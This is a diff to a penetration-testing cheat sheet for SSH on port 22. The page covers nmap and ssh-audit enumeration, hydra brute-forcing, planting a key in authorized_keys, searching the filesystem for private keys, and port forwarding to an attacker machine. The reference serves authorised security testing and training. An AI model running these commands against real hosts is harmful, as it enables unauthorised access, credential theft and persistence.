@@ -1,14 +1,15 @@
 # SSH (22)
 
 !!! tip "Start here"
-    Check what auth methods are enabled: `ssh -v user@$IP`. Look for `publickey,password`. If password auth is on and you have a username, brute force is viable. Run `ssh-audit $IP` to check for weak algorithms and known vulnerabilities.
+    Fingerprint algorithms with `ssh-audit $IP`, then check authentication methods for a known username. A password prompt is evidence that password authentication is available; it is not a reason to begin broad brute force.
 
 ---
 
 ## Enumeration
 
 ```bash
-nmap -p 22 -sV --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos $IP
+nmap -p 22 -sV --script ssh-hostkey,ssh2-enum-algos $IP
+nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=$USERNAME" $IP
 ssh-audit $IP
 ```
 
@@ -17,7 +18,7 @@ ssh-audit $IP
 ## Brute Force
 
 ```bash
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP
+hydra -L users.txt -P passwords.txt ssh://$IP
 ```
 
 ---
@@ -28,8 +29,8 @@ If you have write access to a user's `.ssh` directory (via another vulnerability
 
 ```bash
 ssh-keygen -t ed25519 -f /tmp/injected_key
-cat /tmp/injected_key.pub >> /home/user/.ssh/authorized_keys
-ssh -i /tmp/injected_key user@$IP
+cat /tmp/injected_key.pub >> "/home/$USERNAME/.ssh/authorized_keys"
+ssh -i /tmp/injected_key "$USERNAME@$IP"
 ```
 
 ---
@@ -39,7 +40,7 @@ ssh -i /tmp/injected_key user@$IP
 Look for exposed private keys after gaining access:
 
 ```bash
-find / -name id_rsa -o -name id_ed25519 2>/dev/null
+find / -type f \( -name id_rsa -o -name id_ed25519 \) 2>/dev/null
 grep -rl "PRIVATE KEY" / 2>/dev/null
 ```
 
@@ -52,7 +53,7 @@ Once found:
 
 ```bash
 chmod 600 id_rsa
-ssh -i id_rsa user@$IP
+ssh -i id_rsa "$USERNAME@$IP"
 ```
 
 ---
@@ -62,9 +63,6 @@ ssh -i id_rsa user@$IP
 Forward an internal service to your attacker machine:
 
 ```bash
-ssh -L 8080:127.0.0.1:8080 user@$IP
-ssh -L 3306:127.0.0.1:3306 user@$IP
+ssh -N -L 127.0.0.1:8080:127.0.0.1:8080 "$USERNAME@$IP"
+ssh -N -L 127.0.0.1:3306:127.0.0.1:3306 "$USERNAME@$IP"
 ```
-
-!!! tip "Real-world"
-    SSH brute force is noisy and slow. A better path is username enumeration via Kerberos or SMTP, then targeted spraying with common passwords. Finding an exposed private key during post-exploitation is more reliable than bruteforcing. On cloud instances, check for default usernames (`ubuntu`, `ec2-user`, `admin`) with key-based auth before attempting passwords.
